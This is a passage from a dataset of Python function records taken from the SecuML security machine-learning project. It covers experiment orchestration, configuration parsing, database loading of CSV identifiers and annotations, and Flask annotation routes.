    if not path.isdir(dataset_dir):
        raise DatasetDirNotFound(self.secuml_conf.input_data_dir, self.project, self.dataset)"
ANSSI-FR/SecuML,_set_dataset_id,"def _set_dataset_id(self):
    dataset_obj = get_dataset(self.session, self.project, self.dataset)
    if dataset_obj is not None:
        self.dataset_id = dataset_obj.id
        self.dataset_conf.set_dataset_id(self.dataset_id, self.session)
        self.dataset_conf.set_has_ground_truth(dataset_obj.ground_truth)
        self.idents.check()
    else:
        (_, idents_hash) = self.idents.get_filepath_hash()
        dataset = DatasetsAlchemy(project=self.project, dataset=self.dataset, idents_hash=idents_hash)
        self.session.add(dataset)
        self.session.flush()
        self.dataset_id = dataset.id
        self.dataset_conf.set_dataset_id(self.dataset_id, self.session)
        has_ground_truth = self.idents.load()
        self.dataset_conf.set_has_ground_truth(has_ground_truth)
        dataset.ground_truth = has_ground_truth
        self.session.flush()"
ANSSI-FR/SecuML,add_diadem_exp_to_db,"def add_diadem_exp_to_db(session, exp_id, dataset_id, fold_id, kind, classifier_conf=None):
    if classifier_conf is not None:
        multiclass = classifier_conf.multiclass
        proba = classifier_conf.is_probabilist()
        with_scoring = classifier_conf.scoring_function() is not None
        if kind in ['train', 'cv']:
            perf_monitoring = True
        elif kind in ['test', 'validation', 'alerts']:
            perf_monitoring = False
        model_interp = classifier_conf.is_interpretable()
        if kind == 'cv':
            predictions_interp = False
        else:
            predictions_interp = classifier_conf.interpretable_predictions()
        exp = DiademExpAlchemy(exp_id=exp_id, fold_id=fold_id, dataset_id=dataset_id, type=kind, perf_monitoring=perf_monitoring, model_interp=model_interp, pred_interp=predictions_interp, multiclass=multiclass, proba=proba, with_scoring=with_scoring)
    else:
        exp = DiademExpAlchemy(exp_id=exp_id, fold_id=fold_id, dataset_id=dataset_id, type=kind)
    session.add(exp)
    session.flush()"
ANSSI-FR/SecuML,_get_exp_row,"def _get_exp_row(session, exp_id):
    query = session.query(ExpAlchemy)
    query = query.filter(ExpAlchemy.id == exp_id)
    try:
        return query.one()
    except NoResultFound:
        return None"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp_id):
    self.exp_id = exp_id"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'The experiment %d cannot be found.' % self.exp_id"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp_kind):
    self.exp_kind = exp_kind"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'model-exp-id is a %s experiment while it must be a DIADEM or an ActiveLearning experiment.' % self.exp_kind"
ANSSI-FR/SecuML,__init__,"def __init__(self, message):
    self.message = message"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return self.message"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp_conf, create=True, session=None):
    Experiment.__init__(self, exp_conf, create, session)
    self.test_conf = self.exp_conf.core_conf.test_conf
    self.validation_conf = self.exp_conf.core_conf.validation_conf
    self._init_children_exps()"
ANSSI-FR/SecuML,run,"def run(self, instances=None, cv_monitoring=False, init_classifier=None):
    Experiment.run(self)
    datasets = self._gen_datasets(instances)
    if self.test_conf.method in ['cv', 'temporal_cv', 'sliding_window']:
        if init_classifier is not None:
            raise InvalidInitClassifier('Init classifier cannot be set for CV modes.')
        self._run_cv(datasets, cv_monitoring)
    else:
        self._run_one_fold(datasets, cv_monitoring, init_classifier=init_classifier)"
ANSSI-FR/SecuML,web_template,"def web_template(self):
    return 'diadem/main.html'"
ANSSI-FR/SecuML,get_train_exp,"def get_train_exp(self):
    return self._train_exp"
ANSSI-FR/SecuML,get_detection_exp,"def get_detection_exp(self, kind):
    return self._detection_exp[kind]"
ANSSI-FR/SecuML,get_predictions,"def get_predictions(self, kind):
    return self.get_detection_exp(kind).predictions"
ANSSI-FR/SecuML,_create_train_exp,"def _create_train_exp(self, fold_id=None):
    diadem_id = self.exp_conf.exp_id
    exp_name = 'DIADEM_%i_Train' % diadem_id
    if fold_id is not None:
        exp_name = '%s_fold_%i' % (exp_name, fold_id)
    main_features_conf = self.exp_conf.features_conf
    features_conf = FeaturesConf(main_features_conf.input_features, main_features_conf.sparse, main_features_conf.logger, filter_in_f=main_features_conf.filter_in_f, filter_out_f=main_features_conf.filter_out_f)
    train_exp_conf = TrainConf(self.exp_conf.secuml_conf, self.exp_conf.dataset_conf, features_conf, self.exp_conf.annotations_conf, self.exp_conf.core_conf.classifier_conf, name=exp_name, parent=diadem_id, fold_id=fold_id)
    return TrainExp(train_exp_conf, session=self.session)"
ANSSI-FR/SecuML,_set_train_exp_id,"def _set_train_exp_id(self):
    train_exp_id = self._check_already_trained_conf()
    exp_relation = ExpRelationshipsAlchemy(child_id=train_exp_id, parent_id=self.exp_conf.exp_id)
    self.session.add(exp_relation)
    return train_exp_id"
ANSSI-FR/SecuML,_get_trained_classifier,"def _get_trained_classifier(self, train_exp_id):
    trained_exp = experiment.get_factory().from_exp_id(train_exp_id, self.exp_conf.secuml_conf, self.session)
    trained_conf = trained_exp.exp_conf.core_conf
    trained_classifier = trained_conf.model_class(trained_conf)
    trained_classifier.load_model(path.join(trained_exp.output_dir(), 'model.out'))
    return trained_classifier"
ANSSI-FR/SecuML,_check_already_trained_conf,"def _check_already_trained_conf(self):
    already_trained_id = self.exp_conf.already_trained
    model_exp = _get_exp_row(self.session, already_trained_id)
    if model_exp is None:
        raise ExperimentNotFound(already_trained_id)
    if model_exp.kind == 'Diadem':
        query = self.session.query(DiademExpAlchemy)
        query = query.join(DiademExpAlchemy.exp)
        query = query.join(ExpAlchemy.parents)
        query = query.filter(ExpRelationshipsAlchemy.parent_id == already_trained_id)
        query = query.filter(DiademExpAlchemy.type == 'train')
        query = query.filter(DiademExpAlchemy.fold_id == null())
        query = query.join(DiademExpAlchemy.exp)
        query = query.filter(ExpAlchemy.kind == 'Train')
        res = query.one()
        return res.exp_id
    elif model_exp.kind == 'ActiveLearning':
        return None
    else:
        raise InvalidModelExperimentKind(model_exp.kind)"
ANSSI-FR/SecuML,_create_detection_exp,"def _create_detection_exp(self, kind, classifier_conf, fold_id=None):
    detection_confs = self._create_detection_conf(kind, classifier_conf, fold_id=fold_id)
    global_exp = None
    if len(detection_confs) > 1:
        global_exp = self._create_global_detection_exp(kind, classifier_conf, detection_confs[0].dataset_conf)
        for detection_conf in detection_confs:
            detection_conf.parent = global_exp.exp_id
    return (global_exp, [DetectionExp(detection_conf, session=self.session) for detection_conf in detection_confs])"
ANSSI-FR/SecuML,_create_detection_conf,"def _create_detection_conf(self, kind, classifier_conf, fold_id=None):
    diadem_id = self.exp_conf.exp_id
    exp_name = 'DIADEM_%i_Detection_%s' % (diadem_id, kind)
    if fold_id is not None:
        exp_name = '%s_fold_%i' % (exp_name, fold_id)
    secuml_conf = self.exp_conf.secuml_conf
    logger = secuml_conf.logger
    main_features_conf = self.exp_conf.features_conf
    features_conf = FeaturesConf(main_features_conf.input_features, main_features_conf.sparse, main_features_conf.logger, filter_in_f=main_features_conf.filter_in_f, filter_out_f=main_features_conf.filter_out_f)
    if kind == 'validation' or (kind == 'test' and self.test_conf.method == 'datasets'):
        validation_conf = getattr(self, '%s_conf' % kind)
        annotations_conf = AnnotationsConf('GROUND_TRUTH_IF_EXISTS', None, logger)
        if validation_conf.streaming:
            features_conf.streaming = True
            features_conf.stream_batch = validation_conf.stream_batch
        dataset_confs = [DatasetConf(self.exp_conf.dataset_conf.project, test_dataset, self.exp_conf.secuml_conf.logger) for test_dataset in validation_conf.validation_datasets]
    else:
        dataset_confs = [self.exp_conf.dataset_conf]
        annotations_conf = self.exp_conf.annotations_conf
    alerts_conf = None
    if fold_id is None and kind != 'train':
        alerts_conf = self.exp_conf.alerts_conf
    return [DetectionConf(secuml_conf, dataset_conf, features_conf.deepcopy(), annotations_conf, alerts_conf, name=exp_name, parent=diadem_id, fold_id=fold_id, kind=kind) for dataset_conf in dataset_confs]"
ANSSI-FR/SecuML,_create_global_detection_exp,"def _create_global_detection_exp(self, kind, classifier_conf, dataset_conf):
    diadem_id = self.exp_conf.exp_id
    exp_name = 'DIADEM_%i_GlobalDetection_%s' % (diadem_id, kind)
    secuml_conf = self.exp_conf.secuml_conf
    annotations_conf = self.exp_conf.annotations_conf
    main_features_conf = self.exp_conf.features_conf
    features_conf = FeaturesConf(main_features_conf.input_features, main_features_conf.sparse, main_features_conf.logger, filter_in_f=main_features_conf.filter_in_f, filter_out_f=main_features_conf.filter_out_f)
    alerts_conf = None
    return DetectionExp(DetectionConf(secuml_conf, dataset_conf, features_conf, annotations_conf, alerts_conf, name=exp_name, parent=diadem_id, kind=kind), session=self.session)"
ANSSI-FR/SecuML,_run_one_fold,"def _run_one_fold(self, datasets, cv_monitoring, fold_id=None, init_classifier=None):
    (classifier, train_time) = self._train(datasets, cv_monitoring, fold_id, init_classifier)
    if not self.exp_conf.no_training_detection:
        train_data = datasets.train_instances
        if isinstance(classifier.conf, SemiSupervisedClassifierConf) and self.test_conf.method == 'unlabeled':
            train_data = train_data.get_annotated_instances()
        self._detection('train', classifier, train_data, fold_id)
    (test_predictions, test_time) = self._detection('test', classifier, datasets.test_instances, fold_id)
    if self.validation_conf:
        self._detection('validation', classifier, None, fold_id)
    return (classifier, train_time, test_predictions, test_time)"
ANSSI-FR/SecuML,_train,"def _train(self, datasets, cv_monitoring, fold_id, init_classifier):
    if self.exp_conf.already_trained is not None:
        if init_classifier is not None:
            raise InvalidInitClassifier('Init classifier cannot be set in AlreadyTrained mode.')
        train_exp_id = self._set_train_exp_id()
        return (self._get_trained_classifier(train_exp_id), 0)
    else:
        train_exp = self._create_train_exp(fold_id=fold_id)
        train_exp.run(datasets.train_instances, cv_monitoring=cv_monitoring, init_classifier=init_classifier)
        if fold_id is None:
            self._set_train_exp(train_exp)
        return (train_exp.classifier, train_exp.train_time)"
ANSSI-FR/SecuML,_detection,"def _detection(self, kind, classifier, instances, fold_id):
    (global_exp, detection_exps) = self._create_detection_exp(kind, classifier.conf, fold_id=fold_id)
    if not all((detection_exp.exp_conf.dataset_conf.has_ground_truth == detection_exps[0].exp_conf.dataset_conf.has_ground_truth for detection_exp in detection_exps)):
        raise InvalidValidationDatasets('All the validation datasets must contain ground truth annotations, or none of them.')
    if fold_id is None:
        exp = global_exp if global_exp is not None else detection_exps[0]
        self._set_detection_exp(kind, exp)
    global_predictions = None
    global_prediction_time = None
    for detection_exp in detection_exps:
        detection_exp.run(instances, classifier)
        predictions = detection_exp.predictions
        prediction_time = detection_exp.prediction_time
        if global_exp is not None:
            if global_predictions is None:
                global_predictions = Predictions.deepcopy(predictions)
                global_prediction_time = prediction_time
            else:
                global_predictions.union(predictions)
                global_prediction_time.add(prediction_time)
    if global_exp is not None:
        global_exp.set_predictions(global_predictions, global_prediction_time)
    return (predictions, prediction_time)"
ANSSI-FR/SecuML,_run_cv,"def _run_cv(self, cv_datasets, cv_monitoring):
    classifiers = [None for _ in range(self.test_conf.num_folds)]
    classifier_conf = self.exp_conf.core_conf.classifier_conf
    dataset_id = self.exp_conf.dataset_conf.dataset_id
    add_diadem_exp_to_db(self.session, self.exp_conf.exp_id, dataset_id, None, 'cv', classifier_conf=classifier_conf)
    global_cv_monitoring = CvMonitoring(self, self.test_conf.num_folds)
    for (fold_id, datasets) in enumerate(cv_datasets._datasets):
        (classifier, train_t, predictions, test_t) = self._run_one_fold(datasets, cv_monitoring, fold_id)
        global_cv_monitoring.add_fold(classifier, train_t, predictions, test_t, fold_id)
        classifiers[fold_id] = classifier
    global_cv_monitoring.display(self.output_dir())
    return classifiers"
ANSSI-FR/SecuML,_gen_datasets,"def _gen_datasets(self, instances):
    if instances is None:
        instances = self.get_instances()
    classifier_conf = self.exp_conf.core_conf.classifier_conf
    return self.test_conf.gen_datasets(classifier_conf, instances)"
ANSSI-FR/SecuML,_set_detection_exp,"def _set_detection_exp(self, kind, exp):
    self._detection_exp[kind] = exp"
ANSSI-FR/SecuML,_set_train_exp,"def _set_train_exp(self, exp):
    self._train_exp = exp"
ANSSI-FR/SecuML,_init_children_exps,"def _init_children_exps(self):
    self._train_exp = None
    if self.test_conf.method in ['cv', 'temporal_cv', 'sliding_window']:
        self._detection_exp = None
    else:
        self._detection_exp = {}
        for kind in ['train', 'test', 'validation']:
            self._detection_exp[kind] = None"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp_conf, diadem_exp_id, create=True, session=None):
    ClusteringExperiment.__init__(self, exp_conf, create=create, session=session)
    self.diadem_exp_id = diadem_exp_id"
ANSSI-FR/SecuML,add_to_db,"def add_to_db(self):
    ClusteringExperiment.add_to_db(self)
    from secuml.exp.diadem import add_diadem_exp_to_db
    add_diadem_exp_to_db(self.session, self.exp_id, self.exp_conf.dataset_conf.dataset_id, None, 'alerts')"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp_conf, create=True, session=None):
    self.kind = exp_conf.kind
    Experiment.__init__(self, exp_conf, create=create, session=session)
    self.test_instances = None
    self.predictions = None
    self.prediction_time = None
    self.classifier = None
    alerts_conf = self.exp_conf.core_conf
    self.monitoring = DetectionMonitoring(self, alerts_conf=alerts_conf)"
ANSSI-FR/SecuML,run,"def run(self, test_instances, classifier):
    Experiment.run(self)
    self.classifier = classifier
    self.test_instances = self.get_instances(test_instances)
    self._test(classifier)
    self._export()"
ANSSI-FR/SecuML,set_predictions,"def set_predictions(self, predictions, prediction_time):
    self.predictions = predictions
    self.prediction_time = prediction_time
    self.monitoring.add_predictions(predictions, prediction_time)
    self._export()"
ANSSI-FR/SecuML,web_template,"def web_template(self):
    return 'diadem/detection.html'"
ANSSI-FR/SecuML,add_to_db,"def add_to_db(self):
    Experiment.add_to_db(self)
    has_ground_truth = self.exp_conf.dataset_conf.has_ground_truth
    dataset_id = self.exp_conf.dataset_conf.dataset_id
    self.session.add(DiademExpAlchemy(exp_id=self.exp_conf.exp_id, dataset_id=dataset_id, fold_id=self.exp_conf.fold_id, type=self.kind, perf_monitoring=has_ground_truth))
    self.session.flush()"
ANSSI-FR/SecuML,_test,"def _test(self, classifier):
    (self.predictions, self.prediction_time) = classifier.testing(self.test_instances)
    self.monitoring.add_predictions(self.predictions, self.prediction_time)"
ANSSI-FR/SecuML,_export,"def _export(self):
    self.monitoring.display(self.output_dir())
    self._set_diadem_conf()"
ANSSI-FR/SecuML,_set_diadem_conf,"def _set_diadem_conf(self):
    info = self.predictions.info
    query = self.session.query(DiademExpAlchemy)
    query = query.filter(DiademExpAlchemy.exp_id == self.exp_conf.exp_id)
    diadem_exp = query.one()
    diadem_exp.multiclass = info.multiclass
    diadem_exp.proba = info.with_probas
    diadem_exp.with_scoring = info.with_scores
    if self.classifier is not None:
        classif_conf = self.classifier.conf
        diadem_exp.model_interp = classif_conf.is_interpretable()
        diadem_exp.pred_interp = classif_conf.interpretable_predictions()
    self.session.flush()"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp_conf, create=True, session=None):
    Experiment.__init__(self, exp_conf, create=create, session=session)
    self.classifier = None
    self.train_time = None
    self.monitoring = TrainMonitoring(self)"
ANSSI-FR/SecuML,run,"def run(self, train_instances, cv_monitoring=False, init_classifier=None):
    Experiment.run(self)
    self._train(train_instances, init_classifier)
    if cv_monitoring:
        self._cv_monitoring(train_instances)
    self.monitoring.display(self.output_dir())"
ANSSI-FR/SecuML,add_to_db,"def add_to_db(self):
    from secuml.exp.diadem import add_diadem_exp_to_db
    Experiment.add_to_db(self)
    add_diadem_exp_to_db(self.session, self.exp_conf.exp_id, self.exp_conf.dataset_conf.dataset_id, self.exp_conf.fold_id, 'train', classifier_conf=self.exp_conf.core_conf)"
ANSSI-FR/SecuML,_train,"def _train(self, train_instances, init_classifier):
    if init_classifier is not None:
        self.classifier = init_classifier
        self.train_time = self.classifier.update(train_instances)
    else:
        classifier_conf = self.exp_conf.core_conf
        self.classifier = classifier_conf.model_class(classifier_conf)
        self.train_time = self.classifier.training(train_instances)
    self.monitoring.set_classifier(self.classifier, self.train_time)"
ANSSI-FR/SecuML,_cv_monitoring,"def _cv_monitoring(self, train_instances):
    classifier_conf = self.exp_conf.core_conf
    num_folds = classifier_conf.hyperparam_conf.optim_conf.num_folds
    cv_monitoring = CvMonitoring(self, num_folds)
    try:
        self.classifier.cv_monitoring(train_instances, cv_monitoring)
        self.monitoring.set_cv_monitoring(cv_monitoring)
    except NoCvMonitoring as e:
        self.logger.warning(str(e))"
ANSSI-FR/SecuML,add_to_db,"def add_to_db(self):
    Experiment.add_to_db(self)
    features_set_id = self.exp_conf.features_conf.set_id
    annotations_file = self.exp_conf.annotations_conf.annotations_filename
    stats_exp = FeaturesAnalysisExpAlchemy(id=self.exp_id, features_set_id=features_set_id, annotations_filename=annotations_file)
    self.session.add(stats_exp)
    self.session.flush()"
ANSSI-FR/SecuML,run,"def run(self):
    Experiment.run(self)
    instances = self.get_instances()
    with_density = instances.num_instances() < 10000
    if not with_density:
        self.exp_conf.logger.warning('There are more than 10.000 instances, so the density plots are not displayed.')
    stats = FeaturesAnalysis(instances, self.exp_conf.multiclass, self.exp_conf.logger, with_density=with_density)
    stats.gen_plots(self.output_dir())
    stats.gen_scoring(self.output_dir())"
ANSSI-FR/SecuML,web_template,"def web_template(self):
    return 'features_analysis/main.html'"
ANSSI-FR/SecuML,__init__,"def __init__(self, secuml_conf, dataset_conf, features_conf, annotations_conf, multiclass, name=None, parent=None):
    ExpConf.__init__(self, secuml_conf, dataset_conf, features_conf, annotations_conf, None, name=name, parent=parent)
    self.multiclass = multiclass"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ExpConf.fields_to_export(self)
    fields.append(('multiclass', exportFieldMethod.primitive))
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser():
    parser = argparse.ArgumentParser(description='Features Analysis')
    ExpConf.gen_parser(parser, filters=False, sparse=True)
    AnnotationsConf.gen_parser(parser, required=False, message='CSV file containing the annotations of some\n                               instances, or GROUND_TRUTH to use the ground\n                               truth annotations stored in idents.csv.')
    parser.add_argument('--multiclass', default=False, action='store_true', help='The instances are grouped according to their families instead of their binary labels.')
    return parser"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args):
    if args.annotations_file is None and args.multiclass:
        raise InvalidInputArguments('--annotations <file> is required. An annotation file must be specified to group the instances according to their families.')
    secuml_conf = ExpConf.secuml_conf_from_args(args)
    dataset_conf = DatasetConf.from_args(args, secuml_conf.logger)
    features_conf = FeaturesConf.from_args(args, secuml_conf.logger)
    annotations_conf = AnnotationsConf(args.annotations_file, None, secuml_conf.logger)
    return FeaturesAnalysisConf(secuml_conf, dataset_conf, features_conf, annotations_conf, args.multiclass, name=args.exp_name)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(conf_json, secuml_conf):
    dataset_conf = DatasetConf.from_json(conf_json['dataset_conf'], secuml_conf.logger)
    features_conf = FeaturesConf.from_json(conf_json['features_conf'], secuml_conf.logger)
    annotations_conf = AnnotationsConf.from_json(conf_json['annotations_conf'], secuml_conf.logger)
    conf = FeaturesAnalysisConf(secuml_conf, dataset_conf, features_conf, annotations_conf, conf_json['multiclass'], name=conf_json['name'], parent=conf_json['parent'])
    conf.exp_id = conf_json['exp_id']
    return conf"
ANSSI-FR/SecuML,run,"def run(self, instances=None, export=True):
    Experiment.run(self)
    instances = self.get_instances()
    core_conf = self.exp_conf.core_conf
    dimension_reduction = core_conf.algo(core_conf)
    dimension_reduction.fit(instances)
    if export:
        dimension_reduction.export_fit(self.output_dir(), instances)
    projected_instances = dimension_reduction.transform(instances)
    if export:
        dimension_reduction.export_transform(self.output_dir(), instances, projected_instances)
    return projected_instances"
ANSSI-FR/SecuML,web_template,"def web_template(self):
    return 'projection/main.html'"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser():
    parser = argparse.ArgumentParser(description='Projection of the data for data visualization.')
    ExpConf.gen_parser(parser)
    AnnotationsConf.gen_parser(parser, message='CSV file containing the annotations of some\n                            instances, or GROUND_TRUTH to use the ground\n                            truth annotations stored in idents.csv.\n                            These annotations are used for semi-supervised\n                            projections and are displayed in the GUI.')
    subparsers = parser.add_subparsers(dest='algo')
    subparsers.required = True
    for algo in projection_conf.get_factory().get_methods():
        algo_parser = subparsers.add_parser(algo)
        projection_conf.get_factory().gen_parser(algo, algo_parser)
    return parser"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args):
    secuml_conf = ExpConf.secuml_conf_from_args(args)
    dataset_conf = DatasetConf.from_args(args, secuml_conf.logger)
    features_conf = FeaturesConf.from_args(args, secuml_conf.logger)
    annotations_conf = AnnotationsConf(args.annotations_file, None, secuml_conf.logger)
    core_conf = projection_conf.get_factory().from_args(args.algo, args, secuml_conf.logger)
    return ProjectionConf(secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=args.exp_name)"
ANSSI-FR/SecuML,from_json,"def from_json(conf_json, secuml_conf):
    dataset_conf = DatasetConf.from_json(conf_json['dataset_conf'], secuml_conf.logger)
    features_conf = FeaturesConf.from_json(conf_json['features_conf'], secuml_conf.logger)
    annotations_conf = AnnotationsConf.from_json(conf_json['annotations_conf'], secuml_conf.logger)
    core_conf = projection_conf.get_factory().from_json(conf_json['core_conf'], secuml_conf.logger)
    conf = ProjectionConf(secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=conf_json['name'], parent=conf_json['parent'])
    conf.exp_id = conf_json['exp_id']
    return conf"
ANSSI-FR/SecuML,call_specific_db_func,"def call_specific_db_func(db_type, function, args):
    if db_type == 'mysql':
        from . import mysql_specific
        module = mysql_specific
    elif db_type == 'postgresql':
        from . import postgresql_specific
        module = postgresql_specific
    else:
        assert False
    return getattr(module, function)(*args)"
ANSSI-FR/SecuML,idents_header_info,"def idents_header_info(filename):
    with open(filename, 'r') as f:
        reader = csv.reader(f)
        header = next(reader)
        if header[0] != 'instance_id':
            raise InvalidIdentsFile('The field ""instance_id"" must be the first in idents.csv.')
        elif header[1] != 'ident':
            raise InvalidIdentsFile('The field ""idents"" must be the second in idents.csv.')
        fields = set(header)
        has_timestamp = False
        gt_label = False
        gt_families = False
        if 'timestamp' in fields:
            has_timestamp = True
        if 'label' in fields:
            gt_label = True
        if 'family' in fields:
            gt_families = True
        if not gt_label and gt_families:
            raise InvalidIdentsFile('The field ""label"" must be specified in idents.csv. You cannot specify only the families.')
        return (has_timestamp, gt_label, gt_families)"
ANSSI-FR/SecuML,annotations_with_families,"def annotations_with_families(filename):
    with open(filename, 'r') as f:
        reader = csv.reader(f)
        header = next(reader)
        num_fields = len(header)
        if num_fields >= 2:
            if header[0] != 'instance_id':
                raise InvalidAnnotationsFile('The field ""instance_id"" must be the first in the annotation file %s.' % filename)
            if header[1] != 'label':
                raise InvalidAnnotationsFile('The field ""label"" must be the second in the annotation file %s.' % filename)
            if num_fields == 3:
                if header[2] != 'family':
                    raise InvalidAnnotationsFile('Invalid field %s in the annotation file %s.' % (header[2], filename))
                return True
            elif num_fields == 2:
                return False
            elif num_fields > 3:
                raise InvalidAnnotationsFile('There are too many fields in the annotation file %s.' % filename)
        else:
            raise InvalidAnnotationsFile('Some fields are missing from the annotation file %s. The fields ""instance_id"" and ""label"" are mandatory. The field ""family"" is optional.' % filename)"
ANSSI-FR/SecuML,__init__,"def __init__(self, message):
    self.message = message"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return self.message"
ANSSI-FR/SecuML,__init__,"def __init__(self, message):
    self.message = message"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return self.message"
ANSSI-FR/SecuML,__init__,"def __init__(self, filename, dataset):
    self.filename = filename
    self.dataset = dataset"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'The file %s has been updated since the dataset %s has been loaded.' % (self.filename, self.dataset)"
ANSSI-FR/SecuML,__init__,"def __init__(self, directory, prev_files, new_files):
    self.directory = directory
    self.prev_files = prev_files
    self.new_files = new_files"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'The directory %s has been updated. \nPrevious files: %s\nNew files: %s.' % (self.directory, ', '.join(self.prev_files), ', '.join(self.new_files))"
ANSSI-FR/SecuML,get_trailing_characters,"def get_trailing_characters(filename):
    with open(filename, 'rb') as f:
        line = f.readline()
        last = chr(line[-1])
        last_1 = chr(line[-2])
        if last_1 not in ['\n', '\r']:
            return last
        else:
            return last_1 + last"
ANSSI-FR/SecuML,load_idents,"def load_idents(cursor, filename, dataset_id):
    (has_timestamp, gt_labels, gt_families) = idents_header_info(filename)
    fields = ['user_instance_id', 'ident']
    if has_timestamp:
        fields.append('timestamp')
    if gt_labels:
        fields.append('label')
        if gt_families:
            fields.append('family')
    cursor.execute('LOAD DATA LOCAL INFILE \'%s\' INTO TABLE instances CHARACTER SET UTF8 FIELDS TERMINATED BY \',\' OPTIONALLY ENCLOSED BY \'""\' LINES TERMINATED BY \'%s\' IGNORE 1 LINES (%s) SET dataset_id = %d,row_number = NULL;' % (filename, get_trailing_characters(filename), ','.join(fields), dataset_id))
    cursor.execute('SET @pos = 0;')
    cursor.execute('UPDATE instances SET row_number = ( SELECT @pos := @pos + 1 ) WHERE dataset_id = %d;' % dataset_id)
    return gt_labels"
ANSSI-FR/SecuML,load_partial_annotations,"def load_partial_annotations(cursor, filename, annotations_id, dataset_id):
    families = annotations_with_families(filename)
    cursor.execute(""CREATE TEMPORARY TABLE labels_import(instance_id integer, annotations_id integer DEFAULT %d, user_instance_id integer, label varchar(200), family varchar(200) DEFAULT 'other', iteration integer DEFAULT 0, method varchar(200) DEFAULT 'init');"" % annotations_id)
    fields = ['user_instance_id', 'label']
    if families:
        fields.append('family')
    cursor.execute(""LOAD DATA LOCAL INFILE '%s' INTO TABLE labels_import FIELDS TERMINATED BY ',' LINES TERMINATED BY '%s' IGNORE 1 LINES (%s);"" % (filename, get_trailing_characters(filename), ','.join(fields)))
    cursor.execute('UPDATE labels_import l JOIN instances i ON i.user_instance_id = l.user_instance_id AND i.dataset_id = %d SET l.instance_id = i.id;' % dataset_id)
    cursor.execute('INSERT INTO annotations(instance_id,annotations_id,label,family,iteration,method) SELECT instance_id,annotations_id,label,family,iteration,method FROM labels_import;')"
ANSSI-FR/SecuML,get_engine,"def get_engine(db_uri):
    return sqlalchemy.create_engine(db_uri + '?charset=utf8', echo=False)"
ANSSI-FR/SecuML,random_order,"def random_order(query):
    return query.order_by(func.rand())"
ANSSI-FR/SecuML,load_idents,"def load_idents(cursor, filename, dataset_id):
    (has_timestamp, gt_labels, gt_families) = idents_header_info(filename)
    fields = ['user_instance_id', 'ident']
    if has_timestamp:
        fields.append('timestamp')
    if gt_labels:
        fields.append('label')
        if gt_families:
            fields.append('family')
    cursor.execute('CREATE TEMPORARY TABLE instances_import(user_instance_id integer, ident text, timestamp timestamp DEFAULT null, label boolean default null, family char(200) default null, dataset_id integer DEFAULT %d,row_number serial PRIMARY KEY);' % dataset_id)
    with open(filename, 'r') as f:
        cursor.copy_expert(sql=""COPY instances_import(%s) FROM STDIN WITH CSV HEADER DELIMITER AS ',' ;"" % ','.join(fields), file=f)
    cursor.execute('INSERT INTO instances(user_instance_id,ident,timestamp,label,family,dataset_id,row_number) SELECT user_instance_id, ident, timestamp, label, family, dataset_id, row_number FROM instances_import;')
    cursor.execute('DROP TABLE instances_import;')
    return gt_labels"
ANSSI-FR/SecuML,load_partial_annotations,"def load_partial_annotations(cursor, filename, annotations_id, dataset_id):
    families = annotations_with_families(filename)
    cursor.execute(""CREATE TEMPORARY TABLE annotations_import(instance_id integer, annotations_id integer DEFAULT %d, user_instance_id integer, label boolean, family varchar(200) DEFAULT 'other', iteration integer DEFAULT 0, method varchar(200) DEFAULT 'init');"" % annotations_id)
    with open(filename, 'r') as f:
        fields = ['user_instance_id', 'label']
        if families:
            fields.append('family')
        cursor.copy_expert(sql=""COPY annotations_import(%s) FROM STDIN WITH CSV HEADER DELIMITER AS ',' ;"" % ','.join(fields), file=f)
    cursor.execute('UPDATE annotations_import AS t SET instance_id = i.id FROM instances AS i WHERE i.user_instance_id = t.user_instance_id AND i.dataset_id = %d;' % dataset_id)
    cursor.execute('INSERT INTO annotations(instance_id,annotations_id,label,family,iteration,method) SELECT instance_id,annotations_id,label,family,iteration,method FROM annotations_import;')
    cursor.execute('DROP TABLE annotations_import;')"
ANSSI-FR/SecuML,get_engine,"def get_engine(db_uri):
    return sqlalchemy.create_engine(db_uri, echo=False)"
ANSSI-FR/SecuML,random_order,"def random_order(query):
    return query.order_by(func.random())"
ANSSI-FR/SecuML,getAnnotation,"@app.route('/getAnnotation/<annotations_type>/<annotations_id>/<dataset_id>/<instance_id>/')
def getAnnotation(annotations_type, annotations_id, dataset_id, instance_id):
    annotations_type = AnnotationsTypes[annotations_type]
    annotation = annotations_db_tools.get_annotation(session, annotations_type, annotations_id, dataset_id, instance_id)
    if annotation is None:
        return jsonify({})
    else:
        return jsonify({'label': label_bool_to_str(annotation[0]), 'family': annotation[1]})"
ANSSI-FR/SecuML,removeAnnotation,"@app.route('/removeAnnotation/<exp_id>/<annotations_id>/<instance_id>/')
def removeAnnotation(exp_id, annotations_id, instance_id):
    annotations_db_tools.remove_annotation(session, annotations_id, instance_id)
    session.commit()
    if user_exp:
        exp = update_curr_exp(exp_id)
        filename = path.join(exp.output_dir(), 'user_actions.log')
        file_exists = path.isfile(filename)
        mode = 'a' if file_exists else 'w'
        to_print = ','.join(map(str, [datetime.datetime.now(), 'remove_annotation', instance_id]))
        with open(filename, mode) as f:
            f.write(to_print)
    return ''"
ANSSI-FR/SecuML,updateAnnotation,"@app.route('/updateAnnotation/<exp_id>/<annotations_id>/<iter_num>/<instance_id>/<label>/<family>/<method>/')
def updateAnnotation(exp_id, annotations_id, iter_num, instance_id, label, family, method):
    iter_num = None if iter_num == 'None' else int(iter_num)
    label = label_str_to_bool(label)
